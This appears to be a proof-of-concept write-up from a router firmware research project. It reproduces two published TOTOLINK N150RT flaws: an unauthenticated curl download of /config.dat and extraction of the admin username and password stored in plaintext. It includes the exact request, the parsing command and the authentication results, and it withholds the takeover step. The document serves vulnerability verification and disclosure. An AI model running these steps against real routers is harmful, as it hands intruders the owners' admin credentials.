# PoC 01 — unauthenticated configuration disclosure, and what is inside it

CVE-2019-19822 (access control) and CVE-2019-19823 (plaintext credential
storage), reproduced on the build this unit runs.

## Scope

| | |
|---|---|
| verified on hardware | 2018-01-10 build, `TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002`, `/bin/boa` `sha256 19fe29d7…` |
| verified in emulation | **no** — see *What emulation cannot do* below, and that limit is the interesting part |
| present statically, **not executed** | V2.1.2-B20150825 and V3.4.0-B20201030 both serve `/config.dat` outside the gate ([`auth-flow.md`](../notes/auth-flow.md), [`auth-flow-2020.md`](../notes/auth-flow-2020.md)) |
| not tested at all | every other build in the N150RT line |

## The request

```bash
curl -s -D headers.txt -o config.dat http://10.1.1.1/config.dat
head -3 headers.txt
```

```text
HTTP/1.1 200 OK
Date: Wed, 10 Jan 2018 06:52:28 GMT
Server: Boa/0.94.14rc21
```

7,507 bytes, beginning `COMPCS`. **No credentials were sent.**

*(The date is the build date. This device has no RTC and the isolated segment
has no NTP, so its clock never leaves 2018 — a small thing, but it is the sort
of detail that tells you a capture came from this device rather than a proxy.)*

## Why it is not gated

The authorisation gate in `process_header_end` decides whether to run by testing
the request path for substrings. `/config.dat` contains neither `htm` nor `asp`,
so **the check is not bypassed — it never executes**. Instruction-level reading
in [`auth-flow-2018.md`](../notes/auth-flow-2018.md); the advisory describes the
symptom ("`.dat` files are not restricted") and this is the cause, which is
broader than `.dat`.

Two observations that follow from the mechanism rather than from the advisory:

```text
/config.dat        200, 7507 B     <- outside the gate
/config.dat.htm    302 -> login    <- adding the extension puts it INSIDE
```

## Step 2 — the same bytes, read a second way

This is the part that is not a rediscovery. The file the web server hands out is
compared against the same region read off the SPI flash **through the boot
loader over the serial console** — a path that shares no code with the web
server, the kernel's MTD driver, or Ethernet:

```bash
D=$FWRE_WORK/dumps
echo "served : $(sha256sum config.dat | cut -c1-32)"
echo "flash  : $(dd if=$D/w06-S2-restored.bin bs=1 skip=49152 count=7507 \
                   status=none | sha256sum | cut -c1-32)"
```

```text
served : 9318d1acdb04b58eba22f948ed3c36cc
flash  : 9318d1acdb04b58eba22f948ed3c36cc
IDENTICAL
```

`49152` is `0xC000` in decimal, because `dd` does not take `0x`.

**And the control that makes this stronger than it was in W05.** The same
comparison against the 2026-08-16 full dump comes back *different* — by exactly
the fields an unauthenticated POST round changed on 2026-08-17. So the served
file tracks the live flash contents; it is not a fixed copy laid down at
manufacture. Matching one read proves little; matching **tonight's** read while
differing from **last week's** is what rules that out.

## Step 3 — the credentials, in plaintext

```bash
fwrecon compcs config.dat --offset 0 \
  --mib $ROOTFS/lib/libapmib.so --disclosure reveal -f md \
  | grep -iE 'USER_NAME|USER_PASSWORD'
```

`config.dat` is a `COMPCS`-magic compressed TLV dump of the 413-record APMIB
table; `0xb6` is `USER_NAME` and `0xb7` is `USER_PASSWORD`
([`mib-and-config-dat.md`](../notes/mib-and-config-dat.md)). **There is no
hashing step anywhere on that path** — that is CVE-2019-19823, and it is a
property of the storage format rather than of any one handler.

Those values then authenticate:

```text
correct credentials : HTTP 200
no credentials      : HTTP 302
wrong password      : HTTP 302
Set-Cookie headers  : 0        <- stateless HTTP Basic, every request
```

## What emulation cannot do, and why that is worth knowing

`boa` **does** serve under `qemu-user` on a desktop — see
[`02-command-injection.md`](02-command-injection.md) — but not this chain. At
start-up it opens `/web/config.dat` with `O_RDWR|O_CREAT|O_TRUNC` and takes
`SIGBUS` at an odd address inside `libapmib`; the device's kernel fixes that
unaligned store up and `qemu-user`, having no guest kernel, cannot. The way to
get the server running is to make that one `open()` fail — which means the file
this PoC downloads does not exist there.

**So the line that produces this project's best evidence chain is the same line
that makes it the one link emulation cannot reproduce.** Stating that is more
useful than a scope table that only lists successes.

## What this does not show

- **Nothing here is novel.** Both CVEs were published in December 2019 by Błażej
  Adamczyk. What is this project's own is the second reading of the same bytes
  through the boot loader, and the freshness control above.
- The disclosure is **read-only**. Turning it into a takeover needs
  [`04-auth-takeover.md`](04-auth-takeover.md), which is held.
- Whether the unauthenticated `status.htm` disclosure alongside it is already
  covered by prior art has **not** been checked, and no novelty is claimed for
  it — `PROGRESS.md` open #25.
